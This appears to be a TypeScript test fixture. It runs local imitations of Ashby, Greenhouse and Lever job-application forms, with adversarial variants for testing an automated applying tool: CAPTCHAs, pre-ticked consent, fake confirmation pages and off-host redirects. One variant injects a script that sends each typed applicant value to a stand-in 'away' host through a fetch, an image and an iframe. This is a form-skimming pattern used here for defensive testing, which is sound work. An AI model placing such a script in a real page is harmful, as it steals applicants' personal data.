import { randomUUID } from "node:crypto";
import {
	createServer,
	type IncomingMessage,
	type Server,
	type ServerResponse,
} from "node:http";

/**
 * Local stand-ins for the Ashby, Greenhouse and Lever hosted application forms, built from the
 * DOM recorded in docs/form-inspection.md, with a fake submit endpoint that counts every POST.
 * Tests and the e2e run submit here; nothing leaves the machine.
 *
 * Variants come from the job id, so a seeded job picks its behaviour:
 *   unknown        adds a required yes/no question no approved answer covers
 *   captcha        a visible CAPTCHA challenge instead of a usable form
 *   captcha-after  the challenge appears when submit is clicked; nothing is posted
 *   error-once     the first POST answers 500 with no confirmation; later ones succeed
 *   redirect-away  the form URL on 127.0.0.1 redirects (302) to the same form on localhost
 *   post-away      the form on 127.0.0.1 posts its submission to localhost
 *   nav-away       the form on 127.0.0.1 navigates itself to the same form on localhost
 *   leak-away      as the applicant types, the form on 127.0.0.1 sends each value to localhost in
 *                  the URL of a fetch, an image and an iframe (GETs, none of them navigations)
 *   defaults       optional controls arrive answered: a marketing checkbox checked, a select or
 *                  checkbox group with an option already chosen (Lever: the relocation group has
 *                  "No" ticked as well)
 *   radio-default  Ashby's gender radio arrives with "Male" checked (a radio cannot be unticked)
 *   location-prefix  Lever's location lookup offers only longer names that start with the text
 *   fake-thanks    the submission is refused on a page that only looks like a confirmation:
 *                  Lever lands on /lever/thanks-company/<id>/apply and Greenhouse on
 *                  .../confirmation-failed, both saying "Application rejected"; Ashby shows its
 *                  success container saying so while the form stays on the page
 *
 * The `-away` variants stand in for a board host that sends the applicant elsewhere: tests allow
 * only 127.0.0.1, so localhost is the disallowed destination.
 */

interface FixtureSubmission {
	board: string;
	/** The Host header: 127.0.0.1 (allowed in tests) or localhost (the away host). */
	host: string;
	path: string;
	fields: string[];
	/** Text values by field name, in order (files excluded). */
	values: Record<string, string[]>;
	files: string[];
	at: Date;
}

export interface FixtureBoards {
	url: string;
	server: Server;
	submissions: FixtureSubmission[];
	/** Every request that reached a `/__leak/` URL (the `leak-away` variant), with its host. */
	leaks: { host: string; path: string }[];
	/** POSTs to a job's submit endpoint (by job id). */
	count(jobId?: string): number;
	close(): Promise<void>;
}

const COMMON_STYLE = `body{font-family:system-ui,sans-serif;max-width:720px;margin:24px auto;font-size:14px}
label,.application-label{display:block;font-weight:600;margin:12px 0 4px}
input[type=text],input[type=email],input[type=tel],textarea{width:100%;padding:6px;box-sizing:border-box}
textarea{min-height:70px}.error-message{color:#b00}.banner{background:#eef;padding:6px 10px;margin-bottom:12px;font-size:12px}
.options [role=option]{padding:4px 8px;border:1px solid #ddd;cursor:pointer}.options{position:relative;background:#fff}`;

const CAPTCHA_FRAME = `<iframe title="recaptcha challenge expires in two minutes" src="/recaptcha/api2/bframe?k=fixture" style="width:320px;height:320px;border:2px solid #c00;display:block"></iframe>`;

/** Set per request: where the `-away` variants send the applicant. */
let awayOrigin = "";
let awayVariants = new Set<string>();

function page(title: string, body: string, script = ""): string {
	const away = `window.AWAY_ORIGIN = ${JSON.stringify(awayOrigin)}; window.POST_AWAY = ${awayVariants.has("post-away")};${
		awayVariants.has("nav-away")
			? ` if (location.hostname === "127.0.0.1") setTimeout(() => { location.href = window.AWAY_ORIGIN + location.pathname; }, 150);`
			: ""
	}${
		awayVariants.has("leak-away")
			? ` document.addEventListener("input", (e) => { const leak = window.AWAY_ORIGIN + "/__leak" + location.pathname.replace(/\\/$/, "") + "?d=" + encodeURIComponent(e.target.value || ""); fetch(leak + "&via=fetch", { mode: "no-cors" }).catch(() => {}); new Image().src = leak + "&via=img"; const f = document.createElement("iframe"); f.src = leak + "&via=iframe"; document.body.appendChild(f); });`
			: ""
	}`;
	return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title><style>${COMMON_STYLE}</style><script>${away}</script></head><body><div class="banner">Local fixture of a ${title} form. Submissions stay on this machine.</div>${body}<script>${script}</script></body></html>`;
}

/** The submission target: this origin, or the away origin for `post-away`. */
const SUBMIT_ORIGIN = `(window.POST_AWAY ? window.AWAY_ORIGIN : "")`;

const REQUIRED_CHECK = `
function missingRequired(form) {
	const missing = [];
	for (const el of form.querySelectorAll("[required]")) {
		if (el.type === "checkbox" || el.type === "radio") {
			const group = form.querySelectorAll('[name="' + CSS.escape(el.name) + '"]');
			if (![...group].some((g) => g.checked)) missing.push(el.name);
		} else if (el.type === "file" ? el.files.length === 0 : !el.value.trim()) missing.push(el.name || el.id);
	}
	return [...new Set(missing)];
}
function showCaptchaAfter(root) {
	if (!${"window.CAPTCHA_AFTER"}) return false;
	root.insertAdjacentHTML("beforeend", ${JSON.stringify(CAPTCHA_FRAME)});
	return true;
}`;

function ashbyForm(company: string, variant: Set<string>): string {
	const entry = (
		id: string,
		label: string,
		control: string,
		required = false,
	) =>
		`<div class="_fieldEntry ashby-application-form-field-entry" data-field-path="${id}"><label class="_heading ${required ? "_required_f7cvd_91 " : ""}ashby-application-form-question-title" for="${id}">${label}</label><div>${control}</div></div>`;
	const text = (id: string, required = false, type = "text") =>
		`<input name="${id}" id="${id}" type="${type}" ${required ? 'required=""' : ""} class="ashby-application-form-input-text" value="">`;
	const file = (id: string, required = false) =>
		`<div class="ashby-application-form-input-file"><input type="file" id="${id}" name="${id}" ${required ? 'required=""' : ""} accept="application/pdf,.pdf" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)"><button type="button" class="ashby-application-form-input-file-dropzone-upload" onclick="document.getElementById('${id}').click()">Upload File</button> <span class="file-name"></span></div>`;
	const yesno = (id: string) =>
		`<div class="_yesno ashby-application-form-input-yesno"><button type="button" class="ashby-application-form-input-yesno-option" aria-pressed="false" data-option="yes">Yes</button><button type="button" class="ashby-application-form-input-yesno-option" aria-pressed="false" data-option="no">No</button><input type="checkbox" tabindex="-1" name="${id}" style="display:none"></div>`;
	const fields = [
		entry("_systemfield_name", "Name", text("_systemfield_name", true), true),
		entry(
			"_systemfield_email",
			"Email",
			text("_systemfield_email", true, "email"),
			true,
		),
		entry(
			"_systemfield_resume",
			"Resume",
			file("_systemfield_resume", true),
			true,
		),
		entry("phone", "Phone", text("phone")),
		entry("cover_letter", "Cover Letter", file("cover_letter")),
		entry("question_101", "LinkedIn Profile", text("question_101")),
		entry(
			"question_102",
			`Why do you want to work at ${company}?`,
			`<textarea name="question_102" id="question_102" required=""></textarea>`,
			true,
		),
		entry(
			"question_103",
			"What is your notice period?",
			text("question_103", true),
			true,
		),
		...(variant.has("defaults")
			? [
					entry(
						"question_105",
						"Send me updates about future roles",
						`<label><input type="checkbox" name="question_105" value="yes" checked> Yes, send me updates</label>`,
					),
				]
			: []),
		...(variant.has("unknown")
			? [
					entry(
						"question_104",
						"Will you require visa sponsorship to work for us?",
						yesno("question_104"),
						true,
					),
				]
			: []),
	];
	// As on the real form (2026-11-09): the radio group is its own fieldset, outside any field
	// entry, and its control name starts with a UUID that changes on every page load.
	const eeoName = `${randomUUID()}__systemfield_eeoc_gender`;
	const eeo = `<div class="ashby-application-form-section-container"><h3 class="ashby-application-form-section-header">Voluntary self-identification</h3><fieldset class="_fieldEntry_1e3gg_28 ashby-application-form-input-radio-group"><label class="_heading_f7cvd_52 ashby-application-form-question-title" for="_systemfield_eeoc_gender">Gender</label><div class="ashby-application-form-question-description"><p>Input gender</p></div>${[
		"Male",
		"Female",
		"Decline to self-identify",
	]
		.map(
			(g, i) =>
				`<div class="ashby-application-form-input-radio-group-option"><input type="radio" id="${eeoName}-labeled-radio-${i}" name="${eeoName}" value="${g}"${variant.has("radio-default") && i === 0 ? " checked" : ""}><label class="ashby-application-form-input-radio-group-option-label" for="${eeoName}-labeled-radio-${i}">${g}</label></div>`,
		)
		.join("")}</fieldset></div>`;
	return page(
		"Ashby",
		`<h1>${company}</h1>${variant.has("captcha") ? CAPTCHA_FRAME : `<div class="ashby-application-form-container"><div class="ashby-application-form-section-container">${fields.join("")}</div>${eeo}<button class="ashby-application-form-submit-button"><span>Submit Application</span></button></div>`}`,
		`${REQUIRED_CHECK}
window.CAPTCHA_AFTER = ${variant.has("captcha-after")};
for (const box of document.querySelectorAll(".ashby-application-form-input-yesno")) {
	for (const b of box.querySelectorAll("button")) b.addEventListener("click", () => {
		for (const o of box.querySelectorAll("button")) o.setAttribute("aria-pressed", String(o === b));
		box.querySelector("input").checked = b.dataset.option === "yes";
		box.dataset.answer = b.dataset.option;
	});
}
for (const f of document.querySelectorAll("input[type=file]")) f.addEventListener("change", () => { f.parentElement.querySelector(".file-name").textContent = f.files[0] ? f.files[0].name : ""; });
const root = document.querySelector(".ashby-application-form-container");
const submit = document.querySelector(".ashby-application-form-submit-button");
if (submit) submit.addEventListener("click", async () => {
	for (const e of document.querySelectorAll(".field-error")) e.remove();
	const missing = missingRequired(root).filter((n) => !document.querySelector('.ashby-application-form-input-yesno [name="' + n + '"]'));
	for (const box of root.querySelectorAll(".ashby-application-form-input-yesno")) if (!box.dataset.answer && box.closest(".ashby-application-form-field-entry").querySelector("._required_f7cvd_91")) missing.push(box.querySelector("input").name);
	if (missing.length) { root.insertAdjacentHTML("afterbegin", '<p class="field-error error-message" role="alert">Missing: ' + missing.join(", ") + '</p>'); return; }
	if (showCaptchaAfter(root)) return;
	const data = new FormData();
	for (const el of root.querySelectorAll("input, textarea")) {
		if (el.type === "file") { if (el.files[0]) data.append(el.name, el.files[0]); }
		else if (el.type === "radio") { if (el.checked) data.append(el.name, el.value); }
		else if (el.type === "checkbox" && el.closest(".ashby-application-form-input-yesno")) data.append(el.name, el.closest(".ashby-application-form-input-yesno").dataset.answer || "");
		else if (el.type === "checkbox") { if (el.checked) data.append(el.name, el.value); }
		else data.append(el.name, el.value);
	}
	submit.disabled = true;
	const response = await fetch(${SUBMIT_ORIGIN} + location.pathname.replace(/\\/application$/, "/submit"), { method: "POST", body: data });
	if (response.ok && ${variant.has("fake-thanks")}) root.insertAdjacentHTML("beforebegin", '<div class="ashby-application-form-success-container"><h2>Application rejected</h2><p>Thank you for applying, but this submission was not accepted.</p></div>');
	else if (response.ok) root.outerHTML = '<div class="ashby-application-form-success-container"><h2>Thank you for applying</h2><p>Your application was submitted.</p></div>';
	else { submit.disabled = false; root.insertAdjacentHTML("afterbegin", '<p class="field-error error-message" role="alert">Something went wrong</p>'); }
});`,
	);
}

const PHONE_COUNTRIES = ["United States +1", "Canada +1", "Turkey +90"];

function greenhouseForm(company: string, variant: Set<string>): string {
	const wrapper = (inner: string) =>
		`<div class="field-wrapper">${inner}</div>`;
	const text = (id: string, label: string, required = false, type = "text") =>
		wrapper(
			`<div class="input-wrapper"><label id="${id}-label" for="${id}" class="label">${label}${required ? '<span aria-hidden="true">*</span>' : ""}</label><input id="${id}" name="${id}" type="${type}" aria-required="${required}" class="input" value=""></div>`,
		);
	const select = (
		id: string,
		label: string,
		options: string[],
		required = false,
	) =>
		wrapper(
			`<div class="select"><div class="select__container"><label id="${id}-label" for="${id}" class="label select__label">${label}${required ? '<span aria-hidden="true">*</span>' : ""}</label><div class="select__control"><input class="select__input" id="${id}" role="combobox" aria-required="${required}" aria-labelledby="${id}-label" autocomplete="off" type="text" value="" data-options='${JSON.stringify(options).replace(/'/g, "&#39;")}'><input type="hidden" name="${id}" value=""><div class="options" hidden></div></div></div></div>`,
		);
	const file = (id: string, label: string, required = false) =>
		wrapper(
			`<div role="group" aria-labelledby="upload-label-${id}" aria-required="${required}" class="file-upload"><div id="upload-label-${id}" class="label upload-label">${label}${required ? '<span class="required">*</span>' : ""}</div><button type="button" class="btn btn--pill" onclick="document.getElementById('${id}').click()">Attach</button><label class="visually-hidden" for="${id}">Attach</label><input id="${id}" name="${id}" class="visually-hidden" type="file" accept=".pdf,.doc,.docx,.txt,.rtf" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)"></div>`,
		);
	const fields = [
		text("first_name", "First Name", true),
		text("last_name", "Last Name", true),
		text("email", "Email", true),
		// As on the real form (2026-11-09): a "Country" picker beside the number, which the page
		// sets itself from the number's calling code as it is typed.
		`<div><fieldset class="phone-input"><legend class="visually-hidden">Phone</legend><div class="phone-input__country"><div class="select"><div class="select__container"><label id="country-label" for="country" class="label select__label">Country</label><div class="select__control"><div class="select__single-value"></div><input class="select__input" id="country" role="combobox" aria-required="false" aria-labelledby="country-label" autocomplete="off" type="text" value="" data-options='${JSON.stringify(PHONE_COUNTRIES)}'><input type="hidden" name="country" value=""><div class="options" hidden></div></div></div></div></div><div class="phone-input__phone"><label id="phone-label" for="phone" class="label">Phone</label><input id="phone" name="phone" type="tel" aria-required="false" class="input" value=""></div></fieldset></div>`,
		file("resume", "Resume/CV", true),
		file("cover_letter", "Cover Letter"),
		text("question_201", "LinkedIn Profile"),
		text("question_202", `Why do you want to work at ${company}?`, true),
		text("question_203", "What is your notice period?", true),
		...(variant.has("unknown")
			? [
					select(
						"question_204",
						"Will you now or in the future require sponsorship for a visa?",
						["No", "Yes"],
						true,
					),
				]
			: []),
		"<h3>Voluntary self-identification</h3>",
		variant.has("defaults")
			? wrapper(
					`<label for="gender" class="label">Gender</label><select id="gender" name="gender"><option value="">Select...</option><option selected>Male</option><option>Female</option><option>Decline To Self Identify</option></select>`,
				)
			: select("gender", "Gender", [
					"Male",
					"Female",
					"Decline To Self Identify",
				]),
		...(variant.has("defaults")
			? [
					wrapper(
						`<fieldset><legend>Keep me updated about future roles</legend><label><input type="checkbox" name="marketing_consent" value="1" checked> Yes</label></fieldset>`,
					),
				]
			: []),
	];
	return page(
		"Greenhouse",
		`<h1>${company}</h1>${variant.has("captcha") ? CAPTCHA_FRAME : `<form class="application--form" method="POST" enctype="multipart/form-data" action="${"__ACTION__"}" novalidate><div class="application--questions">${fields.join("")}</div><div class="application--submit"><button type="submit" class="btn btn--pill">Submit application</button></div></form>`}`,
		`${REQUIRED_CHECK}
window.CAPTCHA_AFTER = ${variant.has("captcha-after")};
const form = document.querySelector("form.application--form");
if (form) form.action = ${SUBMIT_ORIGIN} + location.pathname + "/submit";
for (const input of document.querySelectorAll("input[role=combobox]")) {
	const list = input.parentElement.querySelector(".options");
	const hidden = input.parentElement.querySelector("input[type=hidden]");
	const all = JSON.parse(input.dataset.options);
	const render = () => {
		const q = input.value.trim().toLowerCase();
		list.innerHTML = all.filter((o) => !q || o.toLowerCase().includes(q)).map((o) => '<div role="option">' + o + "</div>").join("");
		list.hidden = false;
		for (const opt of list.querySelectorAll("[role=option]")) opt.addEventListener("mousedown", (e) => { e.preventDefault(); input.value = opt.textContent; hidden.value = opt.textContent; list.hidden = true; list.innerHTML = ""; });
	};
	input.addEventListener("click", render);
	input.addEventListener("input", () => { hidden.value = ""; render(); });
	input.addEventListener("keydown", (e) => { if (e.key === "Escape") { list.hidden = true; list.innerHTML = ""; } });
}
const phone = document.getElementById("phone");
if (phone) phone.addEventListener("input", () => {
	const code = (phone.value.match(/^\\+(\\d{1,3})[\\s-]/) || [])[1];
	const box = document.getElementById("country").parentElement;
	box.querySelector(".select__single-value").textContent = code ? "+" + code : "";
	box.querySelector("input[type=hidden]").value = code ? "+" + code : "";
});
if (form) form.addEventListener("submit", (e) => {
	for (const el of form.querySelectorAll(".error-message")) el.remove();
	const missing = [];
	for (const el of form.querySelectorAll('[aria-required="true"]')) {
		if (el.getAttribute("role") === "group") { if (!el.querySelector("input[type=file]").files.length) missing.push(el.id || "file"); continue; }
		const value = el.getAttribute("role") === "combobox" ? el.parentElement.querySelector("input[type=hidden]").value : el.value;
		if (!value.trim()) missing.push(el.id);
	}
	if (missing.length) { e.preventDefault(); form.insertAdjacentHTML("afterbegin", '<p class="error-message" role="alert">This field is required: ' + missing.join(", ") + "</p>"); return; }
	if (showCaptchaAfter(form)) e.preventDefault();
});`,
	);
}

function leverForm(company: string, variant: Set<string>): string {
	const row = (label: string, control: string, required = false) =>
		`<li class="application-question"><label><div class="application-label">${label}${required ? '<span class="required">✱</span>' : ""}</div><div class="application-field">${control}</div></label></li>`;
	const checkboxes = (
		name: string,
		label: string,
		options: string[],
		required = false,
	) =>
		`<li class="application-question custom-question"><div><div class="application-label full-width multiple-select"><div class="text">${label}${required ? '<span class="required">✱</span>' : ""}</div></div><div class="application-field full-width"><ul data-qa="checkboxes">${options
			.map(
				(o) =>
					`<li><label><input type="checkbox" name="${name}" value="${o}" ${required ? 'required=""' : ""}><span class="application-answer-alternative">${o}</span></label></li>`,
			)
			.join("")}</ul></div></div></li>`;
	const fields = [
		`<li class="application-question resume"><div class="application-label">Resume/CV<span class="required">✱</span></div><div class="application-field"><input type="file" name="resume" class="application-file-input" required=""></div></li>`,
		row("Full name", `<input type="text" name="name" required="">`, true),
		row("Email", `<input type="email" name="email" required="">`, true),
		row("Phone", `<input type="text" name="phone">`),
		// As on the real form (2026-11-09, jobs.lever.co/js/retrieveLocations.js): suggestions come
		// from GET /searchLocations 500 ms after the last key, as plain divs picked on mousedown;
		// leaving the box without picking one empties it.
		row(
			"Current location",
			`<input class="location-input" data-qa="location-input" id="location-input" type="text" maxlength="100" name="location" required=""><input id="selected-location" type="hidden" name="selectedLocation"><div class="dropdown-container" style="display:none"><div class="dropdown-results"></div><div class="dropdown-no-results" style="display:none">No location found. Try entering a different location</div></div>`,
			true,
		),
		row("LinkedIn URL", `<input type="text" name="urls[LinkedIn]">`),
		row("GitHub URL", `<input type="text" name="urls[GitHub]">`),
		`<li class="application-question custom-question"><div><div class="application-label full-width"><div class="text">Why do you want to work at ${company}?<span class="required">✱</span></div></div><div class="application-field full-width"><textarea name="cards[c1][field0]" required=""></textarea></div></div></li>`,
		row(
			"What is your notice period?",
			`<input type="text" name="cards[c1][field1]" required="">`,
			true,
		),
		...(variant.has("unknown") || variant.has("defaults")
			? [
					checkboxes(
						"cards[c1][field2]",
						"Are you willing to relocate to Ankara?",
						["Yes", "No"],
						true,
					),
				]
			: []),
		...(variant.has("defaults")
			? [
					checkboxes("cards[c1][field3]", "How did you hear about us?", [
						"LinkedIn",
						"A friend",
					]),
					`<li class="application-question"><label><input type="checkbox" name="consent[marketing]" value="1" checked> Send me future job openings</label></li>`,
				]
			: []),
		row("Additional information", `<textarea name="comments"></textarea>`),
	];
	const ticked = variant.has("defaults")
		? `for (const box of document.querySelectorAll('input[name="cards[c1][field2]"][value="No"], input[name="cards[c1][field3]"][value="LinkedIn"]')) box.checked = true;`
		: "";
	return page(
		"Lever",
		`<h2>${company}</h2>${variant.has("captcha") ? CAPTCHA_FRAME : `<form id="application-form" enctype="multipart/form-data" method="POST"><div class="section application-form"><ul>${fields.join("")}</ul></div><div class="section last-section-apply"><button id="btn-submit" type="button" data-qa="btn-submit">Submit application</button></div></form>`}`,
		`${REQUIRED_CHECK}
${ticked}
window.CAPTCHA_AFTER = ${variant.has("captcha-after")};
const form = document.getElementById("application-form");
const loc = document.getElementById("location-input");
if (loc) {
	const box = loc.parentElement;
	const shown = (sel, on) => { box.querySelector(sel).style.display = on ? "flex" : "none"; };
	const results = box.querySelector(".dropdown-results");
	const selected = document.getElementById("selected-location");
	let found;
	let timer;
	const search = () => {
		results.innerHTML = ""; found = undefined;
		const text = loc.value;
		if (!text) return;
		fetch("/searchLocations?text=" + encodeURIComponent(text) + "${variant.has("location-prefix") ? "&prefix=1" : ""}").then((r) => r.json()).then((list) => {
			found = list;
			results.innerHTML = list.map((l, i) => '<div class="dropdown-location" id="location-' + i + '">' + l.name + "</div>").join("");
			shown(".dropdown-no-results", list.length === 0);
		}).catch(() => shown(".dropdown-no-results", true));
	};
	loc.addEventListener("input", () => shown(".dropdown-container", true));
	loc.addEventListener("keydown", () => { clearTimeout(timer); timer = setTimeout(search, 500); });
	loc.addEventListener("blur", () => {
		if (box.querySelector(".dropdown-container").style.display !== "none") {
			shown(".dropdown-container", false); results.innerHTML = ""; loc.value = ""; selected.value = "";
		}
	});
	document.addEventListener("mousedown", (e) => {
		const option = e.target.closest && e.target.closest(".dropdown-location");
		if (!option) return;
		shown(".dropdown-container", false);
		loc.value = option.textContent;
		selected.value = JSON.stringify(found[Number(option.id.split("-")[1])]);
		results.innerHTML = "";
	});
}
const button = document.getElementById("btn-submit");
if (button) button.addEventListener("click", () => {
	for (const el of form.querySelectorAll(".error-message")) el.remove();
	const missing = missingRequired(form);
	if (loc && !form.querySelector("input[name=selectedLocation]").value) missing.push("location");
	if (missing.length) { form.insertAdjacentHTML("afterbegin", '<div class="error-message" role="alert">Please fill in: ' + [...new Set(missing)].join(", ") + "</div>"); return; }
	if (showCaptchaAfter(form)) return;
	form.action = ${SUBMIT_ORIGIN} + location.pathname;
	form.submit();
});`,
	);
}

/**
 * Lever's location lookup: the typed text as a suggestion (second, so a pick is not just the
 * first one), or with `prefix` only longer names ending in ", Region" (a name that already ends
 * so is offered as it is).
 */
function searchLocations(params: URLSearchParams): { name: string }[] {
	const typed = params.get("text") ?? "";
	const names =
		params.has("prefix") && !typed.endsWith(", Region")
			? [`${typed}, Region`, `${typed} Province, Region`]
			: [`${typed} Province`, typed];
	return names.map((name) => ({ name }));
}

/** The fixture server's own routes (records, Lever's lookup, a challenge page); true when served. */
function serveUtility(
	url: URL,
	req: IncomingMessage,
	res: ServerResponse,
	state: Pick<FixtureBoards, "submissions" | "leaks">,
): boolean {
	const json = (body: unknown) => {
		res.writeHead(200, { "content-type": "application/json" });
		res.end(JSON.stringify(body));
	};
	if (url.pathname === "/__submissions") json(state.submissions);
	else if (url.pathname === "/searchLocations")
		json(searchLocations(url.searchParams));
	else if (url.pathname.startsWith("/__leak/")) {
		state.leaks.push({
			host: (req.headers.host ?? "").split(":")[0] ?? "",
			path: url.pathname,
		});
		res.writeHead(204);
		res.end();
	} else if (url.pathname.startsWith("/recaptcha/")) {
		res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
		res.end(page("Challenge", "<p>Select all images with traffic lights.</p>"));
	} else return false;
	return true;
}

async function readBody(req: IncomingMessage): Promise<string> {
	const chunks: Buffer[] = [];
	for await (const chunk of req) chunks.push(chunk as Buffer);
	return Buffer.concat(chunks).toString("latin1");
}

/** Starts the fixture boards on 127.0.0.1 (port 0 = any free port). */
export async function startFixtureBoards(port = 0): Promise<FixtureBoards> {
	const submissions: FixtureSubmission[] = [];
	const leaks: FixtureBoards["leaks"] = [];
	const failedOnce = new Set<string>();
	const companyName = (key: string) =>
		decodeURIComponent(key)
			.split("-")
			.map((w) => w.charAt(0).toUpperCase() + w.slice(1))
			.join(" ");
	const server = createServer(async (req, res) => {
		const url = new URL(req.url ?? "/", "http://127.0.0.1");
		const parts = url.pathname.split("/").filter(Boolean);
		const html = (status: number, body: string) => {
			res.writeHead(status, { "content-type": "text/html; charset=utf-8" });
			res.end(body);
		};
		if (serveUtility(url, req, res, { submissions, leaks })) return;
		const [board, company = "", ...rest] = parts;
		const jobId = board === "greenhouse" ? (rest[1] ?? "") : (rest[0] ?? "");
		const variant = new Set<string>();
		if (/-defaults/.test(jobId)) variant.add("defaults");
		for (const v of [
			"unknown",
			"captcha-after",
			"error-once",
			"redirect-away",
			"post-away",
			"nav-away",
			"leak-away",
			"radio-default",
			"fake-thanks",
			"location-prefix",
		])
			if (jobId.includes(v)) variant.add(v);
		const port = (server.address() as { port: number }).port;
		const onAllowedHost = (req.headers.host ?? "").startsWith("127.0.0.1");
		awayOrigin = `http://localhost:${port}`;
		awayVariants = variant;
		if (variant.has("redirect-away") && onAllowedHost && req.method === "GET") {
			res.writeHead(302, { location: `${awayOrigin}${url.pathname}` });
			res.end();
			return;
		}
		if (!variant.has("captcha-after") && jobId.includes("captcha"))
			variant.add("captcha");
		const name = companyName(company);
		if (req.method === "POST") {
			const body = await readBody(req);
			const fields = [...body.matchAll(/name="([^"]+)"(?!; filename)/g)].map(
				(m) => m[1] ?? "",
			);
			const values: Record<string, string[]> = {};
			for (const m of body.matchAll(/name="([^"]+)"\r\n\r\n([\s\S]*?)\r\n--/g))
				values[m[1] ?? ""] = [...(values[m[1] ?? ""] ?? []), m[2] ?? ""];
			const files = [...body.matchAll(/name="([^"]+)"; filename="([^"]*)"/g)]
				.filter((m) => m[2])
				.map((m) => `${m[1]}=${m[2]}`);
			submissions.push({
				board: board ?? "",
				host: (req.headers.host ?? "").split(":")[0] ?? "",
				path: url.pathname,
				fields,
				values,
				files,
				at: new Date(),
			});
			const key = `${board}/${company}/${jobId}`;
			if (variant.has("error-once") && !failedOnce.has(key)) {
				failedOnce.add(key);
				if (board === "ashby") {
					res.writeHead(500, { "content-type": "application/json" });
					res.end('{"error":"server"}');
				} else
					html(
						500,
						page(
							"Error",
							"<h1>Something went wrong</h1><p>Please try again later.</p>",
						),
					);
				return;
			}
			if (board === "ashby") {
				res.writeHead(200, { "content-type": "application/json" });
				res.end('{"ok":true}');
				return;
			}
			const done = variant.has("fake-thanks")
				? board === "greenhouse"
					? `${url.pathname.replace(/\/submit$/, "")}/confirmation-failed`
					: `/lever/thanks-company/${jobId}/apply?status=rejected`
				: board === "greenhouse"
					? `${url.pathname.replace(/\/submit$/, "")}/confirmation`
					: `${url.pathname.replace(/\/apply$/, "")}/thanks`;
			res.writeHead(303, { location: done });
			res.end();
			return;
		}
		if (board === "ashby" && rest[1] === "application")
			return html(200, ashbyForm(name, variant));
		if (board === "greenhouse" && rest[0] === "jobs" && rest.length === 2)
			return html(200, greenhouseForm(name, variant));
		if (board === "greenhouse" && rest[2] === "confirmation-failed")
			return html(
				200,
				page(
					"Greenhouse",
					"<h1>Application rejected</h1><p>Your application could not be submitted.</p>",
				),
			);
		if (board === "lever" && url.searchParams.get("status") === "rejected")
			return html(
				200,
				leverForm(name, variant).replace(
					"<h2>",
					"<h2>Application rejected</h2><h2>",
				),
			);
		if (board === "greenhouse" && rest[2] === "confirmation")
			return html(
				200,
				page(
					"Greenhouse",
					`<h1>Thank you for applying to ${name}!</h1><p>Your application has been submitted.</p>`,
				),
			);
		if (board === "lever" && rest[1] === "apply")
			return html(200, leverForm(name, variant));
		if (board === "lever" && rest[1] === "thanks")
			return html(
				200,
				page(
					"Lever",
					`<h2>Application submitted!</h2><p>Thanks for applying to ${name}.</p>`,
				),
			);
		html(404, page("Not found", "<h1>Not found</h1>"));
	});
	await new Promise<void>((done) => server.listen(port, "127.0.0.1", done));
	const address = server.address() as { port: number };
	const base = `http://127.0.0.1:${address.port}`;
	return {
		url: base,
		server,
		submissions,
		leaks,
		count: (jobId?: string) =>
			submissions.filter((s) => !jobId || s.path.includes(`/${jobId}/`)).length,
		close: () =>
			new Promise<void>((done) => {
				server.closeAllConnections?.();
				server.close(() => done());
			}),
	};
}
